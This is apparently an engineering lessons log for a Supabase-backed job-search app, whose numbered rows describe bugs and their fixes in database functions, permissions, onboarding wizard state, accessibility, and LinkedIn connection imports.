| 187 | **A profile change re-triages a decided row** (G8 / AC 18) | One clause, `triage = ''`, in `app_commit_profile` AND in `buildRegatePlan` AND in the fake. Server-side because a client bug must not route around it. Mutants red: the SQL clause removed (2 db tests), the client clause removed (2 vitest) | ✅ |
| 188 | **A dismissed row reanimates when the profile widens** (G3 / AC 19) | The same clause, with its own case and its own positive control — the two negatives are meaningless beside a plan that never restamps anything, so a third test asserts an untriaged row DOES newly qualify | ✅ |
| 189 | **The plan is trusted instead of re-verified** | The preview's promises are re-checked at commit time INSIDE the transaction, under the row lock: still untriaged, tuple really different, `filtered` entries carrying a reason (0002's CHECK would otherwise abort a 4,000-row save over one malformed entry). P9's lesson verbatim. The mutant removing the tuple check SURVIVED the first pass, because a plan built by `buildRegatePlan` never contains such an entry — the plan the server gets is not always freshly built, and the test was the thing that was wrong | ✅ |
| 190 | **A report that counts what the plan hoped for** | `restamped` and `newly_qualified_keys` come from what the UPDATE actually did, read through a `before` CTE in the same statement so it sees the pre-update snapshot. Row 169's shape: nobody can re-derive this afterwards, and a banner promising rows that were not written is worse than no banner | ✅ |
| 191 | **Two tabs saving a profile deadlock** | Every `user_postings` row the plan touches is locked in ASCENDING KEY ORDER in one statement before any of them is written. Row 95, on a new surface: two tabs hand the function the same keys in whatever order their own reads produced, and each holding the row the other wants next is a 40P01 surfaced as a generic failure for a valid gesture | ✅ |
| 192 | **A metro spelled differently in two languages** | `test_metro_names.py` parses `webapp/lib/profile/metros.ts` and asserts the list IS `monitor/metros.METROS`'s keys — same members, same order. `dispose` compares metros with `==`, so "Washington D.C." here and "Washington DC" there is an empty queue and no error anywhere. Mutant red. Metro RESOLUTION stays in Python; only the 15 names are duplicated | ✅ |
| 193 | **A preset that rots away from the profile it was copied from** | `test_profile_presets.py` parses `presets.ts` against `users/*/profile.yaml`. Those two title lists are the only ones anybody has tuned against a live feed — Salman's excludes `pmm` and `product analyst`, Dad's excludes `financial advisor` and `personal banker`, each for a reason somebody learned the hard way — and a copy with nothing pinning it means the next person to onboard learns them again. Mutant red on one deleted chip | ✅ |
| 194 | **A duplicate DOM id from two things that share a name** | `<section id="countries">` (the `reasonSetting()` anchor) and `<input id="countries">` (the chip editor) on one page: the label association breaks and `/settings#countries` is ambiguous. Found by a strict-mode locator resolving to two elements, which is the browser saying the HTML is wrong. Chip inputs are `${field}-input` now | ✅ |
| 195 | **Muted text on a selection tint fails AA** | 4.28:1 on the SELECTED radio card, caught by axe the first time `/settings` entered `resilience.spec.ts`. Row 82 exactly, on a new surface: a tint strong enough to read as "this is your answer" is too dark for `#707067`. The selected card's body is promoted to `text-2`; the unselected ones keep the muted tone, which is what makes the chosen one legible AS chosen | ✅ |
| 196 | **A zero-result profile renders a bare number** | The preview names the binding constraint, the name is a LINK, and the link lands on the section with focus moved to its heading — through the existing anchor ids, not a second set (plans/README C11). The primary button reads "Save anyway" rather than being disabled, because zero may be exactly what somebody meant and refusing it is the app arguing with its user | ✅ |
| 197 | **Preview numbers go stale after an edit** | Any criteria change marks them stale in words and puts the primary button back on Check. A number computed against settings that have since changed is worse than no number, because it looks current | ✅ |
| 198 | **A profile saved with nobody having seen the consequences** | Save is refused until the settings have been checked at least once, on both surfaces. This is the whole phase in one interaction: every other mistake in this app announces itself, and this one is silent for weeks | ✅ |
| 199 | **The wizard loses answers on refresh or Back, twice over** | The draft lives in `?d=` (base64url JSON). Writing it only on Next leaves a value typed ON a step absent from that step's own entry; a debounced `router.replace` then broke it AGAIN, because the debounce's cleanup fires when the step changes — pressing Next within 250ms of typing cancelled the write to the entry being left behind, which is exactly the sequence a person performs. `history.replaceState` now: Next intercepts it, it is synchronous, and it cannot be cancelled by the navigation it races. Mutant red at the Back assertion | ✅ |
| 200 | **The wizard gates on a client counter** | It gates on `data-step`, derived from the ROUTE SEGMENT, so it cannot advance before the navigation happened and cannot be reset by a remount. Row 164's lesson taken as a rule rather than re-learned | ✅ |
| 201 | **Focus lost between wizard steps** | Focus moves to the new step's heading. Without it the URL moved, the DOM swapped, and focus stayed on a Next button that no longer exists — a screen-reader user hears nothing at all. Mutant red | ✅ |
| 202 | **A wizard inside the group that redirects to it** | `/onboarding` lives OUTSIDE `(app)`, whose layout carries the guard, so the loop is structurally impossible rather than avoided by a path check somebody gets wrong on a rename. The guard is in the layout rather than in middleware — one read per page render beside reads the page was making anyway, versus one per request including the RSC payloads a single navigation fans out into — it fails OPEN, and it re-throws through `unstable_rethrow`, because `redirect()` works by throwing and a bare catch turns the guard into a no-op that renders the shell anyway | ✅ |
| 203 | **A new user lands on an empty queue with no explanation** | The layout redirects to `/onboarding/1` while `criteria = '{}'`, asserted across five surfaces rather than one — a guard on the queue alone is a guard a bookmark routes around. Reachable at all only because the `onboarding` demo seed exists: the fixture profile is complete by construction, so without it both the redirect and the whole six-step wizard would ship unexercised (row 15's lesson on the one surface where "unreachable through the app" is the point) | ✅ |
| 204 | **A non-allowlisted account is told to try again, forever** | 0001's signup trigger raises and Supabase surfaces it as a token-exchange failure, so the one person the allowlist is FOR read "Sign-in didn't complete. Try again." — and did, because that is what the message said. `/auth/callback` maps the trigger's own wording to `/login?error=not_allowed`, which says the address is not on the invite list and names the only action that can help. A miss degrades to the generic message rather than to something wrong | ✅ |
| 205 | **Long chip lists blow out the wizard** | `/onboarding/1`, `/2`, `/2?d=<long draft>` and `/6` join `layout.spec.ts` at six widths, WITH the seed cookie — a static path list that redirects to `/settings` is row 170's sweep credited with a screen it never loaded. The long draft is a real 92-character FP&A title plus six metros, not a lorem string, and the chip text wraps (`break-all` on the text, not the chip) | ✅ |
| 206 | **A click into a server-rendered, unhydrated form** | Both new surfaces publish `data-hydrated` from an EFFECT, and every e2e entry gates on it rather than on `toBeVisible`. The pipeline paid for this lesson with two blur-commits that left zero POSTs in the trace on a loaded CI runner; row 21 is the same thing from the keyboard side. Sampled counts and attributes go through `expect.poll` for the matching reason — `clearChips` was the worst of them, because `count()` is an instant read and a loop starting at zero exits immediately and reports success on a list it never touched | ✅ |
| 207 | **An e2e that cannot fail, found by watching two mutants survive** | The zero-result case first used a nonsense country and never reached zero, because a blank-country remote posting bypasses the geo gate BY DESIGN (G17's converse) — the test was wrong about the product. The double-submit case asserted the idempotency key and a mutant rotating the key per attempt survived twice: with a non-null `expectedUpdatedAt` the version token catches the second gesture FIRST, so from a browser the two mechanisms cannot be separated. That claim moved to where it can fail (`test_profile.py` replays one key and counts exactly one `profile.changed` event), and the e2e says in the file what it does not claim. Row 128's rule | ✅ |
| 208 | **The queue's own empty state still names its constraint by histogram** | `bindingConstraint()` groups a user's own filtered rows by setting and names the biggest — which is right about the LINK and can be wrong about the ADVICE for exactly row 183's reason: gates short-circuit, so the setting with the most first-hit reasons is frequently not the one starving the queue. The preview does it by relaxation; the queue does not yet. **Open**, and deferred rather than missed: the relaxation pass needs the profile beside the rows in that render path. The sentence and its link are asserted today (row 15, `routing.spec.ts`), so this can only get better, not quietly worse | ⬜ |

| 209 | **"Something else" was silently rewritten to product management** | `parseCriteria`'s `text()` fell back to `BASE_CRITERIA` on an EMPTY STRING, and the preset sets all three free-text fields to `""` on purpose — so choosing it and typing nothing stored `role_family: "product manager"`, `tag_domain: "product-manager"` and `board_search_term: "product"` under the name of somebody who had explicitly said it was not that, with the tagger and the board sweep both acting on it. A deliberate empty string survives now; a non-string still falls back, because that is a malformed request rather than an answer. Browser-verified by the reviewer | ✅ |
| 210 | **Removing a lie leaves an unanswerable profile, so the wizard has to ask** | Step 1 gates Next on `role_family` AND `board_search_term` (the corpus-wide boards have no company list to walk and are searched by keyword, so a blank one silently drops a whole source); step 2 gates on one title, because an empty `titles_include` matches NOTHING and produces an empty queue by construction. Both say why beside the disabled control rather than after it is pressed. `tag_domain` falls back to the role family at save time — which is what its PLACEHOLDER displays, so the stored value is the one the screen promised. `/settings` gets the same gate in words | ✅ |
| 211 | **A default that describes a search it cannot run** | Found by the existing tests going red on row 210: `BASE_CRITERIA.role_family` is "product manager" (faithful to `Profile`'s dataclass) while its `titles_include` is empty, so a fresh wizard read as "Product management selected" over a title list step 2 then refused to advance. Both page fallbacks are `draftFromPreset("product-manager")` — internally consistent, every value visible and editable | ✅ |
| 212 | **A fake that models the RESULT and never the MAPPING** | `isOnboarded`'s `return true` mutant survived 383 tests, because `FixtureDataSource.profile()` answered the `ProfileView` it was handed. It stores `criteria` as the database does now — a jsonb object, `{}` for nobody-completed-this — and runs the same two calls in the same order as `SupabaseDataSource.profile()`. The distinction is load-bearing in both directions: somebody who chose every default must not be sent back through onboarding forever, and somebody who never arrived must not be dropped into an empty queue | ✅ |
| 213 | **A restamp that changed only its reason was reported as newly qualifying** | The `b.was <> 'qualified'` half of the filter had no test and dropping it survived. A row moving `qualified`/`""` → `qualified`/`yoe-unknown` IS a restamp and is NOT news — the banner would say "N previously-filtered postings now qualify" and link somebody at rows that were never filtered. Two cases: the reason-only restamp excluded, and a `needs-info` row becoming qualified INCLUDED, because the filter tests `was <> 'qualified'` and not `was = 'filtered'` | ✅ |
| 214 | **The only thing bounding a page render's work had no test** | `limit 500000` survived. 5,100 postings in the window, 5,000 returned | ✅ |
| 215 | **A belt pinned by a text search for its own phrase** | `auth.uid() is not null` was asserted by grepping the migration, so a tautology (`or true`) passed. EXECUTED now: clear `hq.test_user` and the corpus answers zero rows, beside a positive control proving it answers at all | ✅ |
| 216 | **`revoke all … from public` closes nothing** | Supabase's bootstrap grants execute on new functions to `anon` and `authenticated` BY NAME, and revoking from `public` does not touch a named grant — so a mutant granting `app_preview_corpus` to `anon` passed the generic check, on the one function in the schema that deliberately bypasses RLS. The guard names all three roles per callable definer. `KNOWN_UNNAMED_REVOKES` carries the 21 PRE-EXISTING functions in the same shape (each rejects an anonymous session in its own body, which is why it is debt and not an open door), asserted EXACT in both directions so a new function cannot join silently and fixing one means deleting its line. Closing those 21 is one clause each in the migrations that define them | ✅ |
| 217 | **A jsonb column a browser can make arbitrarily large** | `p_criteria` was stored verbatim and unbounded from a function granted to `authenticated`. 64 kB and 200 keys, both dimensions because either alone is trivially avoided (100k one-byte keys, or one 10 MB string); `p_notify` gets the same door precisely because this phase never edits it and would be the one to forget | ✅ |
| 218 | **A blank idempotency key replays forever** | `command_idempotency`'s primary key is (user_id, idem_key) and `''` is a legal text value, so one caller sending an empty key would have every LATER empty key replay the first gesture's result. Guarded with `hq_blank_trim`, not `length() = 0` — a key of one space is blank to a person and length 1 to Postgres, which is 0010's newline bug in a new place (rows 110, 129). The probe had to fix the TEST HELPER first, whose `idem or uuid4()` was answering the empty string on the function's behalf | ✅ |
| 219 | **A `::timestamptz` cast credited with work the parameter type does** | The migration prose said the casts were what made the conflict check compare instants. They are decoration: both operands are already typed by then and the reviewer's `::text` mutant correctly survives. What protects it is the PARAMETER TYPE, now pinned by `test_the_version_token_is_compared_as_an_instant` — which accepts either a `timestamptz` declaration or a `text[]` parameter cast before use, because 0006 and 0008 legitimately do the latter | ✅ |
| 220 | **A stated tradeoff that did not state its consequence** | The widening's header argued the projection and the caps and never named the part that is easy to skip: `company` on those rows is the UNION of every user's watched companies, which is exactly what 0002's `companies_visible_to_watchers` exists to hide. Fair at allowlist scale — a family of three, a ceiling of ten, every member known to the others — and the trigger to replace it with a per-user corpus is now written where the tradeoff lives | ✅ |
| 221 | **An example that illustrated a different fact than the sentence above it** | `bindingSample` matched on the collapsed SETTING, and several kinds share one anchor (`geo` and `geo-unknown` both map to `countries`), so a `geo_unknown` sentence — "how unplaceable locations are handled" — could be illustrated by a posting in India. Matched on the reason KIND now, and no example at all rather than a wrong one when the binding field produced no reason of its own. Browser-verified | ✅ |
| 222 | **Tie order carried the advice and nothing pinned it** | Two ties are genuine and go opposite ways for stated reasons: an all-`comp-unknown` corpus is recovered equally by the policy and by deleting the floor, and the policy wins because telling somebody to remove their compensation floor when half the feed states no pay is advice about the wrong thing; a `metro-unknown` corpus is recovered equally by clearing the metro list and by the unplaceable policy, and the metro list wins because that is what a local search is thinking about. HEAD was correct both times and nothing checked either | ✅ |
| 223 | **`formatG` unpinned off two floors a bare `String()` reproduces** | 120 and 122.5 both render identically under `String()`, so the corpus could not tell the port from the shortcut. A 12.3456789 floor renders `comp:<12.3457k` under Python's six-significant-digit `:g` | ✅ |
| 224 | **A docstring that claimed 313 codepoints did not exist** | The casefold table's comment said an unmapped character folds identically in both languages. False for 313 of them. `ς` is mapped — a single-character fold, which the sharp-s EXPANSION did not cover — and the docstring now names both shapes and what is deliberately left out. The corpus case took two attempts: a token written with final sigma on BOTH sides passes either way, so the discriminator is a NON-final sigma in the configured token against a word-final capital in the posting, which JS `toLowerCase()` renders as ς and Python casefolds to σ | ✅ |
| 225 | **A number the screen states and the query does not use** | `windowDays` was clamped for `p_days` and the PANEL was handed the raw value, so asking for 3,650 days rendered "collected in the last 3650 days" over a 90-day corpus. And the FAKE clamped correctly — the reverse of the house rule, and what would have hidden it. One `clampWindowDays` at the source boundary, called by both | ✅ |
| 226 | **An over-cap wizard draft was dropped silently AND unrecoverably** | `encodeDraft` returned `""`, indistinguishable from "nothing to encode", so the caller wrote a bare `?d=`, the sync effect then rewrote the URL from the baseline, and Back could not reach the answers because the entry holding them had already been overwritten. Browser-verified at ~2.9 kB of chips. It answers `null` now, the wizard says so in words, keeps the last URL that DID fit, and refuses to navigate — which is what keeps the answers on screen to be shortened. Still drop-not-truncate: a truncated base64url decodes to something | ✅ |
| 227 | **Dead code carrying a promise** | `unknownMetros`/`isKnownMetro` were exported, documented and CALLED BY NOTHING, while the doc comment promised the warning: a metro the engine cannot produce matches nothing at all, because `dispose` compares `geo.metro` with `==`. The warning exists, with an e2e that also proves a real metro does not trip it (a warning that is always on is the same defect one level down). `regatePlanFor` deleted, no callers. The no-op ternary in `pyStr` gone, with a note on what it was attempting. `reasonCounts` stays and its docstring now says why it is computed and deliberately not rendered — a first-hit histogram beside the relaxation answer would offer two answers and let somebody pick the wrong one | ✅ |
| 228 | **A pay field that exposed its own storage unit** | "Minimum pay, in thousands", `type="number"`, max 2000. The owner read that as a $2,000 ceiling on his first run, which is what it said. `comp_min` still stores $thousands, because `dispose()` reads it there and stamps `comp:<120k` into the audit trail — the translation moved to `lib/profile/money.ts`, one boundary, with `parseCriteria` and the corpus tests untouched. `200000`, `200k` and `$200,000` all land on the same number and it comes back formatted. `200` is two hundred dollars, deliberately: guessing the magnitude is the failure the formatting exists to make visible. Found while writing the e2e — the first `MoneyField` rewrote its own value on FOCUS, and because focus schedules a React update while the select-all was computed against the value being replaced, the next typed value landed appended: `$200,000` over `$200,000` parsed as $200,000,200,000 and clamped. Nothing happens on focus now | ✅ |
| 229 | **Six steps organised around the engine's fields** | Three of them asked about unknown-handling policies, which are the engine's questions and nobody else's, and the sixth was a preview with nothing to do but agree. Two now: what are you looking for, then where and how much, with the preview INLINE under the last question and the rest behind a `More filters` disclosure carrying the same defaults. `LAST_STEP` is the single source — `clampStep`, `data-last-step`, the step label, the visual spec and `draft.test.ts` all read it, after the six-step version was found hard-coded in a test that then failed for the shape of the change rather than for anything wrong | ✅ |
| 230 | **Step one made two professions the frame** | Three radio cards, two of them job families the owner happens to be in, and everyone else had to select "Something else" before the app would talk to them. It is a text box now, and the two curated lists are template BUTTONS at the bottom — still worth offering, since `users/salman` and `users/dad` are the only title lists anybody has tuned against a live feed (`test_profile_presets.py` still pins both), but offering them first is what told a nurse this was not built for her. What made the demotion possible is `lib/profile/derive.ts`: `titles_include` and `board_search_term` fill in from the role AS IT IS TYPED, into fields that stay visible and editable, so one field is a whole profile and the two blocking gates from row 210 are gone. It is not row 209's lie returning — that wrote "product manager" OVER an answer; this writes what the person typed, where they can see it. A fresh wizard opens EMPTY rather than on the product-management preset, which row 211 chose for reasons the radios no longer create | ✅ |

| 228 | **A regexp is a shape, not a date** | `hq_connection_rows` guarded its `::date` with `^\d{4}-\d{2}-\d{2}$`, which accepts `2026-13-45` and `2026-02-31` — and the cast then raises 22008 and takes the whole 1,000-row chunk down, which is the exact failure the guard's own comment claimed it prevented. `to_date(x,'YYYY-MM-DD')` is not the fix either: the docs call it lenient and on this Postgres both strings raise from inside it, so a `to_char(to_date(…))` round trip is still a throw. `hq_iso_date` does the cast inside a plpgsql exception block, which is the only construct in SQL that turns a raise into a value; `when others` is deliberate because the two shapes raise 22008 and 22007 and a narrower catch leaks whichever it did not name. Found by the db suite, not by review | ✅ |
| 229 | **A merge closed in one direction is a permanent duplicate** | LinkedIn withholds a connection's profile URL while they have it restricted, so the row is stored under `profile_url = ''`. They un-restrict it; next month's export carries the URL; `connections_by_profile` is PARTIAL on `profile_url <> ''` and sees no conflict — the same human lands twice and can never merge again, with `deduped: 0` on both reports so nothing on screen says anything happened. The first draft guarded only the other direction and reasoned about precisely this scenario in the comment beside it. A promotion pass claims the stored row instead, keeping the `connected_on` the new line does not carry, with a `not exists` for the case where the URL is already held and a `distinct on` so the join partner cannot be arbitrary | ✅ |
| 230 | **A new column that renders past the container's right edge** | The Warm column was appended last, and at 1280px the seven existing /jobs columns already fill the scroll container exactly — so the entire feature was off-screen on the default desktop view. Nothing in the suite could have said so: `layout.spec.ts` measures painted overflow of the PAGE, which is clean by construction because the grid scrolls inside itself, and every functional assertion locates the cell by testid whether it is visible or not. The first recorded baseline is what showed it. Third column now, with Posted as the cheapest thing to push off. Rows 22–24's rule, arriving through a screenshot again | ✅ |
| 231 | **A green typecheck and a red build** | `import { FUZZY_FLOOR } from "./suggest"` followed by `export { FUZZY_FLOOR }` creates a local binding AND an export of one name. `tsc --noEmit` accepts it; `next build` refuses it ("individual declarations in merged declaration must be all exported or all local"). So `npm run typecheck` — the gate a person runs — was green while the thing that ships could not compile. `export … from` has no local binding and no such hazard. The lesson is the gate list: typecheck is not a build | ✅ |
| 232 | **A cell that reaches a server action cannot live in a unit-testable module** | Putting `<WarmCell>` in `lib/grid/columns.tsx` pulled `lib/referral/actions.ts` → `getDataSource` → the `server-only` reader into the module graph, and `grid-columns.test.ts` and `view-state.test.ts` both failed to LOAD — zero tests, not zero assertions. The column declares itself and `jobs-grid.tsx` renders the real cell, which is the split the Why chip already used for a softer reason | ✅ |
| 233 | **"Nobody works here" and "you imported nothing" are one boolean** | Two states with opposite remedies: one is a fact about the company, the other is a thing to go and do. `WarmContext.hasAnyConnections` keeps them apart and the popover renders a different sentence for each — row 15's lesson (`/queue` saying "Nothing to triage" whether the sweep found nothing or the profile gated everything out) on a new surface, and the `empty` demo seed now clears connections so the second state is reachable through the only source the tests can drive | ✅ |
| 234 | **A facet present-and-empty reads as "nobody"** | `currentCompany=[]` is a real LinkedIn search that returns nothing, and a reader takes an empty result for an answer about the company rather than about the URL. `peopleSearchUrl` DROPS ids that are not digits — the column is free-vocab by 0008's precedent, so it must — and when a facet's ids are all dropped the facet is absent rather than empty. Asserted in both directions, because the drop alone would be the bug | ✅ |
| 235 | **A space encoded as `+` searches for a plus sign** | `URLSearchParams.toString()` is form-urlencoded; `+` means a space only to a decoder that knows the format. LinkedIn's keyword box is the one place in this feature where that guess is visible, and `product+manager` returns nothing. Rewritten to `%20`, which is safe as a blanket replace precisely because the serializer ran first: a `+` somebody typed is already `%2B` by then | ✅ |
| 236 | **An `sr-only` control has no name** | axe went red the first time /connections was scanned: `sr-only` hides the file input from SIGHT, not from the accessibility tree, and the visible control is the button beside it. A screen-reader user landed on an unnamed input. Same family as row 23 — a decorative-looking element that is still in the tree | ✅ |
| 237 | **A version token that is really a mirror-activity timestamp** | `companies_touch` fired on every UPDATE, and `public.companies` is the only versioned table here a BULK MIRROR rewrites wholesale — `discover_universe.upsert_universe` posts the whole ~640-row universe with `resolution=merge-duplicates`, which is `on conflict … do update` and fires the trigger on rows where every value is byte-identical (measured: the token moved 3ms, nothing else did). So the sequence was: /jobs renders and captures the token, the sweep runs, the paste 409s, and the UI says "Somebody set this on another device. Reload to see their value." Nobody did, and the reload shows the same empty cell. `when (old.* is distinct from new.*)`, on this trigger and not the six beside it — the others are written only by RPCs that already decided the row changed. Two tests, because the naive fix ("never move it") passes the first: the no-op leaves the token alone AND a paste held across a no-op sweep still lands, with the existing stale-token test as the control | ✅ |
| 238 | **The fake was not more forgiving, it was DIFFERENT** | The promotion pass existed in SQL and not in `FixtureDataSource`, so for the one scenario matrix row 229 was written for, Postgres answered `{inserted: 0, updated: 1}` with one row and the fake answered `{inserted: 1, updated: 0}` with two — the demo and every E2E run minting the permanent duplicate the pass exists to prevent, and the four-number report a person READS disagreeing with production's. The usual house rule is "a fake that is kinder hides the bug"; this is the sharper version, a fake that answers a different question. `parity.test.ts`'s 0013 section pinned MAX_CHUNK, the source tags, the id regexp and every refusal string and pinned NOTHING about promotion, which is how it shipped — it now pins the three SQL clauses by text AND the four numbers by behaviour, because a text pin alone passes on a fake that has the clauses and misuses them | ✅ |
| 239 | **The test a file calls "THE assertion" racing the write it exists to prove** | `click()` resolves on dispatch, not on the handler's `await`, so `await page.reload()` on the next line cancels the in-flight server action. It passed only because the in-memory fake answers in microseconds; a 400ms delay injected into the fake turns it red. Gated on the toast, which is rendered from inside the `result.ok` branch and nothing else produces — a popover also closes on an outside click or Escape. Rows 21/206's data-gated-entry rule, applied on the way OUT | ✅ |
| 240 | **A build-log claim that a state was reachable, when no seed produced it** | Row 233's actual fix — the branch keeping "nobody you know works here" apart from "you have not uploaded anything" — was reachable through no demo seed, and this table said `empty` covered it. It does not: `empty` clears the postings too, so there is no ROW to carry a chip. The e2e admitted that in a comment and then asserted /connections copy under a name promising a job-row claim, which is the shape of green test this file is a catalogue of. A fifth seed (`no-connections`: everything except the export) plus a positive control on the other branch, so neither sentence can be hardcoded and pass both | ✅ |
| 241 | **A cap the app enforces and never mentions** | `connections()` reads the first 5,000 rows by name and the upload accepts 5,000 — so past the ceiling rows are STORED and never read, the count on /connections stops being "how many you have", and every warm popover under-counts for names after the cut. The upload's refusal actively walked people into it: "Split the file and upload it in two passes — both halves merge into one list." Both halves land; the second is invisible. The refusal names the real ceiling now, and the surface says so only when a user is AT it — a warning nobody can be affected by is the noise that teaches people to skip warnings | ✅ |
| 242 | **Row 227 reintroduced in the branch that cites it three times** | `TableMeta.warm` carried a 12-line rationale and was read by nothing (the override renders from the component's own prop); the Warm column's dash cell was documented as "the NO-CONTEXT branch" and was unreachable, because the grid hides the column outright in exactly that case. Writing the rationale is not what makes code live. Both deleted; the column is now the one entry in `GRID_COLUMNS` with no `cell`, asserted — alongside every other column still having one, so the assertion is about this column and not about the type | ✅ |
| 243 | **The first place a SQL-generated key meets a TS-computed one** | `company_name_key` has three implementations pinned to one corpus, and the corpus carries a measured divergence (Postgres folds U+0130 to a bare `i`; JS and Python to `i` + U+0307). It had never mattered because both sides of every previous comparison came from the same language — `reconcile_grounded_company` keys the raw name itself. `indexConnections` compares the generated column against `companyNameKey`, so a company named with that codepoint is a silent NON-match: stored, indexed, never found by its own row. Not fixed (the fix is changing one of three implementations of a key already in a generated column and a unique index), stated where it is reachable and pinned so it cannot get quietly worse. A non-match rather than a wrong match, which is the right way round | ✅ |
| 244 | **A comment that framed the benign reading as the only one** | `companies_unresolved_name_key` is PARTIAL on `ats = '' and slug = ''`, so two DIFFERENT grounded companies sharing a normalized name (`Apex`/`APEX`, both real) are legal — and `indexUniverse` hands a posting from one the LinkedIn id of the other, which `linkedin.ts` itself describes as sending outreach to strangers at another company. The comment described only the multi-board case it collapses correctly. The test now asserts the WRONG answer on purpose, because pretending otherwise is how somebody re-derives it as a bug in six months, and pins what IS guaranteed: the collapse is deterministic across input order, so clearing the id makes it stay cleared | ✅ |
| 245 | **The constraint the whole feature is shaped by, enforced by prose** | Nothing forbade a `fetch` appearing in `lib/referral/` — and one added two phases from now (an enrich button, a favicon, a preview card) is not a bug to fix later, it is the account the feature depends on being suspended. Eleven outbound shapes swept across five files, including the ones a reviewer would not think of: `<img>`, `new Image()`, `backgroundImage` and the resource hints are all automated requests to linkedin.com carrying the user's cookies, made per grid row, without anybody calling it scraping. Three things keep it from being theatre — comments stripped before matching (every guarded file explains what it does not do, several naming `fetch` while doing so), the directory ENUMERATED so a file added later must be guarded or exempted with a reason, and the patterns run against a sample containing all eleven so a regexp that matches nothing cannot pass vacuously. **Not claimed:** that it is a security boundary. Somebody adding a fetch can delete it in the same commit; it makes that a deliberate act with a diff beside it | ✅ |
| 246 | **A perf budget that structurally excludes the newest component** | `?perf=5000` is store-free, so it builds no warm context, so `jobs-grid.tsx` hides the Warm column — and every budget in `grid-perf.spec.ts` is therefore measured over a grid without the `Popover.Root` each painted Warm cell mounts. Named in both places rather than closed, with the bound that makes it acceptable (react-virtual paints ~80 rows, so the cost does not grow with the data) and the trigger that ends it (any work that is not per-painted-row — a subscription, a timer, an observer — and the harness has to learn to build a context). Rows 101/138's family: a budget's silence about what it does not cover reads as coverage | ✅ |

| 247 | **A knockout question with no rule looks answered** | The metric the whole auto-apply feature is judged on is "wrong knockout answers (must be zero, ever)", and the engine's half — gap on `policy-unset`, consult no other layer — was built in #82. The SURFACE's half is this: an unset rule renders as an unanswered question with no control pre-selected, the count of unset knockout topics is stated in words above them (`data-unset-knockouts`), and the gap card on the review screen carries the topic's own name and a link to the one place that answers it everywhere. `answers.spec.ts` asserts `input[type=radio]:checked` is ZERO on an unset knockout, which is the assertion a "sensible default" would fail | ✅ |
| 248 | **Self-identification declined on somebody's behalf** | `FieldOption.declineToAnswer` is carried by the parser so the surface can OFFER it, and until now nothing offered it — an affordance named in the contract and implemented nowhere, which is row 227's shape in a place where the cost is a demographic answer nobody chose. The review screen renders the board's own options INCLUDING the decline, opens on none of them, and says what storing one means. `matchOption` still refuses that option from every engine layer, so the only way it can ever be submitted is a person picking it | ✅ |
| 249 | **The submitted option id shown where a person expects an answer** | Greenhouse's Yes/No selects are `{label: "Yes", value: 1}` and `prepare.ts` stages the VALUE, correctly — that is what a board accepts. Rendering it raw put “Will you now or in the future require visa sponsorship? — 0” on screen: a machine token in front of a human (row 181's family) that also reads as the opposite of the truth. The review row renders the option's LABEL and names the token beside it (“submits as 0”), so neither has to be guessed. Found by looking at the page, not by a test | ✅ |
| 250 | **The provenance ratchet guards a column the caller controls, and the surface said otherwise** | 0014's trigger refuses a `suggested` write on top of a `user-entered` one, and its own comment calls that half ADVISORY: `provenance` is the caller's claim, so the ratchet refuses an honest downgrade and cannot refuse a dishonest one. The fake reproduces the refusal verbatim (pinned to the migration text) and the settings surface does not lean on it: a machine-written row is marked from `authored_by` — the SERVER's stamp — and says what it may not answer. The one thing that would be a lie is a UI implying `provenance` protects anything, and none of the copy does | ✅ |
| 251 | **A reserved migration number with nothing enforcing the reservation** | 0013 and 0014 were assigned up front so two branches could not collide the way P7 and P8 did on 0008, and `test_migrations.py`'s contiguity guard grew a declared `RESERVED_MIGRATION_NUMBERS` asserted in BOTH directions: an undeclared gap still fails, and the day the reserved file lands the reservation goes red until its line is deleted. It worked — 0013 landed with referral, its line came out in the same merge, and this branch inherited a sequence with no hole in it. Recorded because the mechanism is invisible when it succeeds, and the next parallel pair will want it. **Superseded** — the next parallel pairs did want it, and the bill came due: the list is global, so every branch edited it and every merge invalidated the next branch's copy (four hand-resolved conflicts in one session, zero defects caught). The serial scheme closed at `0028`, migrations are now stamped `YYYYMMDD_HHMMSS_name.sql`, and hole-detection moved to the `schema_migrations` ledger, which knows what actually ran. See `db/README.md` | ✅ |
| 252 | **`authored_by` missing from a select, silently** | `lib/apply/index.ts` puts it in bold and it is the one clause a reviewer would skim: leaving the column out of the `answers` select does not fail, it turns every sensitive library row into a gap while the row sits visibly on the settings page. Pinned by TEXT in `parity.test.ts` (the select list is extracted from the source and asserted to contain it), because a stub client cannot tell a missing column from a null one. Watched red by deleting the column | ✅ |
| 253 | **A third opinion on a fact's shape, looser than the engine can survive** | SQL checks a `countries` fact is a non-empty ARRAY and says nothing about its elements, so `["united states", 5]` is a legal row and a TypeError inside `deriveAnswer`; Postgres's `\d` is `[[:digit:]]`, so a date in Arabic-Indic digits passes the CHECK and fails `[0-9]`. `parseSituationFact` is deliberately the STRICTEST of the three and both divergences run the same way round — this side refuses rows the database accepts, never the reverse. Executed in `parity.test.ts` rather than described, with the CHECK's seven `when` arms extracted from the migration and compared against what the parser implements | ✅ |
| 254 | **An unreadable rule reported as the wrong kind of missing** | A fact this build cannot parse is DROPPED from the engine's input rather than passed through with a placeholder. Passing it would give `prepare.ts` a rule for the topic and produce `situation-mismatch` — "your rule does not fit this question" — when the truth is "nothing here could read your rule". Dropping it produces `policy-unset`, which is the accurate sentence and the one the settings surface can act on. The row is still shown, with its own state, because a rule that exists and answers nothing is not the same as no rule | ✅ |
| 255 | **…and that state was unreachable behind the one above it** | Both "no rule" and "unreadable rule" carry a null fact, so the `stored === null` branch swallowed the second: a rule that exists and answers nothing rendered identically to no rule at all. Checked in the other order now, with `data-unreadable` beside `data-set`, and it counts as UNSET in the knockout tally because that is what it is to an application. The state is reachable only from a SEED — no UI write can produce it, since the settings action runs the same parser the reader does — which is exactly why the fixture library carries one (row 15's rule, on a branch a person meets when a script has written for them) | ✅ |
| 256 | **A toggle that does not move until a round trip lands** | The company-exception switch was rendered straight from server state, so it sat still until the write returned — which reads as broken and is how people learn to click things twice. Playwright said so first: `uncheck()` refuses when the click does not change the state. Optimistic now, and the frame never invents a version token — it copies the one it replaces, which is what keeps the token the NEXT write sends correct (row 134's rule from the other side) | ✅ |
